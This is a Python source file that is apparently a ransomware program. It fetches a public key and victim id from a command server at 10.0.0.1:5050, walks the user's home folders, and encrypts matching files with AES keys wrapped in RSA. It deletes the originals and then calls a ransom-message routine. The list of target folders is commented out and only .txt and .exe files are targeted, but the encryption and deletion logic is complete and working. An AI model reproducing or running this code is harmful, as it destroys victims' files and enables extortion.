from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding as sym_padding
from concurrent.futures import ThreadPoolExecutor
from os import path
import requests
import os
from message import create_message

SERVER="10.0.0.1"
PORT="5050"

def encrypt_file(file_path, public_key):
    # Generate a new AES key and IV
    aes_key = os.urandom(32)
    iv = os.urandom(16)

    # Read file contents
    with open(file_path, 'rb') as file:
        file_data = file.read()

    # Pad the data
    padder = sym_padding.PKCS7(128).padder()
    padded_data = padder.update(file_data) + padder.finalize()

    # Encrypt the data with AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv),
                    backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    # Encrypt the AES key with RSA public key
    encrypted_aes_key = public_key.encrypt(
        aes_key,
        rsa_padding.OAEP(
            mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Remove the original file safely after encryption
    try:
        os.remove(file_path)
        print(f"Original file {file_path} removed after encryption.")
    except OSError as e:
        print(f"Error: {file_path} : {e.strerror}")

    # Save encrypted file contents and AES key
    with open(file_path + '.enc', 'wb') as encrypted_file:
        encrypted_file.write(iv + encrypted_aes_key + encrypted_data)


def encrypt_directory(directory_path, public_key_data, extensions):
    # Convert the public key string to a public key object
    public_key_bytes = public_key_data.encode('utf-8')
    public_key = serialization.load_pem_public_key(
        public_key_bytes, backend=default_backend()
    )

    # Prepare a list of files to encrypt based on the extensions
    files_to_encrypt = []
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            if file.endswith(tuple(extensions)):
                file_path = os.path.join(root, file)
                files_to_encrypt.append(file_path)

    # Use ThreadPoolExecutor to encrypt files concurrently
    with ThreadPoolExecutor() as executor:
        # Map each file to the encrypt_file function alongside the loaded public key
        executor.map(lambda file: encrypt_file(file, public_key), files_to_encrypt)


def fetch_key():
    url = f'http://{SERVER}:{PORT}/publickey'

    # Send a GET request
    response = requests.get(url)

    # Check if the request was successful
    if response.status_code == 200:
        # Parse JSON from the response
        data = response.json()
        print(data)
        id = data['id']
        public_key = data['publickey']
        return public_key, id
    else:
        print(f'Failed to retrieve data: status code {response.status_code}')

def main():
    # Example usage
    public_key, id = fetch_key()  # Run once to generate keys
    home_dir = os.path.expanduser('~')

    # Extensions to target
    extensions = ['.txt', '.exe']

    # Directories to target
    user_dirs = [
        #os.path.join(home_dir, 'Documents'),
        #os.path.join(home_dir, 'Pictures'),
        # os.path.join(home_dir, 'Desktop'),
        #os.path.join(home_dir, 'Downloads'),
        #os.path.join(home_dir, 'Videos'),
        #os.path.join(home_dir, 'Music'),
        #os.path.join(home_dir, 'OneDrive')
    ]

    for directory in user_dirs:
        if os.path.exists(directory):
            encrypt_directory(directory, public_key, extensions)
        else:
            print(f"Directory does not exist: {directory}")

    create_message(SERVER, PORT, id)


main()
